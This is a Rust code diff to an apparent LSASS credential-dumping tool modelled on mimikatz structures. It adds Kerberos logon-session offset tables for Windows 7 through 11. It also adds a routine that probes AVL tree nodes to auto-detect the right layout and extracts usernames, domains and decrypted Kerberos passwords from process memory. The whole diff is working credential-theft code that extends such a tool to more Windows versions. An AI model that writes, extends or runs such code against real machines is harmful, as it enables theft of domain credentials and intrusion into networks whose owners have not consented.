@@ -5,44 +5,31 @@ use crate::lsass::types::KerberosCredential;
 use crate::memory::VirtualMemory;
 use crate::pe::parser::PeHeaders;
 
-/// Kerberos session offsets (Windows 10 x64 1607+).
-/// KIWI_KERBEROS_LOGON_SESSION_10_1607 layout (x64):
-///   +0x00: UsageCount (ULONG + 4 pad)
-///   +0x08: unk0 (LIST_ENTRY, 16 bytes)
-///   +0x18: unk1 (PVOID)
-///   +0x20: unk1b (ULONG + 4 pad)
-///   +0x28: unk2 (FILETIME)
-///   +0x30: unk4 (PVOID)
-///   +0x38: unk5 (PVOID)
-///   +0x40: unk6 (PVOID)
-///   +0x48: LocallyUniqueIdentifier (LUID, 8 bytes)
-///   ... more fields ...
-///   +0x88: credentials (PVOID -> KIWI_KERBEROS_PRIMARY_CREDENTIAL)
-///
+/// Kerberos session offsets per Windows version (x64).
 /// KerbGlobalLogonSessionTable is an RTL_AVL_TABLE (since Vista).
 /// Each AVL tree node has RTL_BALANCED_LINKS (0x20 bytes) header,
 /// followed by the session entry data.
-/// So entry data offset from node = 0x20.
 struct KerbOffsets {
-    /// Offset of session data from AVL node (sizeof(RTL_BALANCED_LINKS))
     avl_node_data_offset: u64,
     luid: u64,
     credentials_ptr: u64,
+    /// Password offset within KIWI_KERBEROS_PRIMARY_CREDENTIAL
+    cred_password: u64,
 }
 
-const KERB_OFFSETS: KerbOffsets = KerbOffsets {
-    avl_node_data_offset: 0x20,
-    luid: 0x48,
-    credentials_ptr: 0x88,
-};
-
-/// KIWI_KERBEROS_PRIMARY_CREDENTIAL_1607 offsets:
-///   +0x00: UserName (UNICODE_STRING, 16 bytes)
-///   +0x10: DomainName (UNICODE_STRING, 16 bytes)
-///   +0x20: unk0 (PVOID, 8 bytes)
-///   +0x28: unk_padding (8 bytes)
-///   +0x30: Password (UNICODE_STRING, 16 bytes, encrypted)
-const KERB_CRED_PASSWORD_OFFSET: u64 = 0x30;
+/// Multiple offset variants for different Windows versions.
+const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
+    // Win10 1607+ / Win11: KIWI_KERBEROS_LOGON_SESSION_10_1607
+    // Password at +0x30 in cred (extra unk0+padding before Password)
+    KerbOffsets { avl_node_data_offset: 0x20, luid: 0x48, credentials_ptr: 0x88, cred_password: 0x30 },
+    // Win10 1507-1511: KIWI_KERBEROS_LOGON_SESSION_10_1507
+    // Password at +0x28 in cred (no extra padding)
+    KerbOffsets { avl_node_data_offset: 0x20, luid: 0x48, credentials_ptr: 0x88, cred_password: 0x28 },
+    // Win8/8.1: KIWI_KERBEROS_LOGON_SESSION_10
+    KerbOffsets { avl_node_data_offset: 0x20, luid: 0x40, credentials_ptr: 0x80, cred_password: 0x28 },
+    // Win7: KIWI_KERBEROS_LOGON_SESSION
+    KerbOffsets { avl_node_data_offset: 0x20, luid: 0x18, credentials_ptr: 0x50, cred_password: 0x28 },
+];
 
 /// Extract Kerberos credentials from kerberos.dll.
 pub fn extract_kerberos_credentials(
@@ -113,7 +100,8 @@ pub fn extract_kerberos_credentials(
     walk_avl_tree(vmem, root_node, table_addr, &mut nodes, 0);
     log::info!("Kerberos AVL tree: found {} nodes", nodes.len());
 
-    let offsets = &KERB_OFFSETS;
+    // Auto-detect offset variant by probing first non-empty node
+    let offsets = detect_kerb_offsets(vmem, &nodes);
 
     for node_ptr in &nodes {
         let entry = node_ptr + offsets.avl_node_data_offset;
@@ -121,15 +109,11 @@ pub fn extract_kerberos_credentials(
         let cred_ptr = vmem.read_virt_u64(entry + offsets.credentials_ptr).unwrap_or(0);
 
         if cred_ptr != 0 && luid != 0 {
-            // KIWI_KERBEROS_PRIMARY_CREDENTIAL_1607:
-            //   +0x00: UserName (UNICODE_STRING, 16 bytes)
-            //   +0x10: DomainName (UNICODE_STRING, 16 bytes)
-            //   +0x30: Password (UNICODE_STRING, 16 bytes, encrypted)
             let username = vmem.read_win_unicode_string(cred_ptr).unwrap_or_default();
             let domain = vmem.read_win_unicode_string(cred_ptr + 0x10).unwrap_or_default();
 
             if !username.is_empty() {
-                let password = extract_kerb_password(vmem, cred_ptr, keys).unwrap_or_default();
+                let password = extract_kerb_password(vmem, cred_ptr, offsets.cred_password, keys).unwrap_or_default();
                 if !password.is_empty() {
                     log::info!("Kerberos: LUID=0x{:x} user={} domain={}", luid, username, domain);
                     results.push((
@@ -179,19 +163,45 @@ fn walk_avl_tree(
     walk_avl_tree(vmem, right, sentinel, results, depth + 1);
 }
 
+/// Auto-detect Kerberos offset variant by probing AVL tree nodes.
+fn detect_kerb_offsets(vmem: &impl VirtualMemory, nodes: &[u64]) -> &'static KerbOffsets {
+    for node_ptr in nodes {
+        for variant in KERB_OFFSET_VARIANTS {
+            let entry = node_ptr + variant.avl_node_data_offset;
+            let luid = match vmem.read_virt_u64(entry + variant.luid) {
+                Ok(l) => l,
+                Err(_) => continue,
+            };
+            if luid == 0 || luid > 0xFFFFFFFF {
+                continue;
+            }
+            let cred_ptr = match vmem.read_virt_u64(entry + variant.credentials_ptr) {
+                Ok(p) => p,
+                Err(_) => continue,
+            };
+            if cred_ptr < 0x10000 || (cred_ptr >> 48) != 0 {
+                continue;
+            }
+            // Try reading username from credential structure
+            let username = vmem.read_win_unicode_string(cred_ptr).unwrap_or_default();
+            if !username.is_empty() && username.len() < 256 {
+                log::debug!("Kerberos: auto-detected offsets luid=0x{:x} cred=0x{:x} pwd=0x{:x}",
+                    variant.luid, variant.credentials_ptr, variant.cred_password);
+                return variant;
+            }
+        }
+    }
+    &KERB_OFFSET_VARIANTS[0]
+}
+
 pub fn extract_kerb_password(
     vmem: &impl VirtualMemory,
     cred_ptr: u64,
+    password_offset: u64,
     keys: &CryptoKeys,
 ) -> Result<String> {
-    // KIWI_KERBEROS_PRIMARY_CREDENTIAL_1607:
-    //   +0x00: UserName (UNICODE_STRING, 16 bytes)
-    //   +0x10: DomainName (UNICODE_STRING, 16 bytes)
-    //   +0x20: unk0 (PVOID, 8 bytes)
-    //   +0x28: unk_padding (8 bytes)
-    //   +0x30: Password (UNICODE_STRING, 16 bytes, encrypted)
-    let pwd_len = vmem.read_virt_u16(cred_ptr + KERB_CRED_PASSWORD_OFFSET)? as usize;
-    let pwd_ptr = vmem.read_virt_u64(cred_ptr + KERB_CRED_PASSWORD_OFFSET + 8)?;
+    let pwd_len = vmem.read_virt_u16(cred_ptr + password_offset)? as usize;
+    let pwd_ptr = vmem.read_virt_u64(cred_ptr + password_offset + 8)?;
 
     if pwd_len == 0 || pwd_ptr == 0 {
         return Ok(String::new());
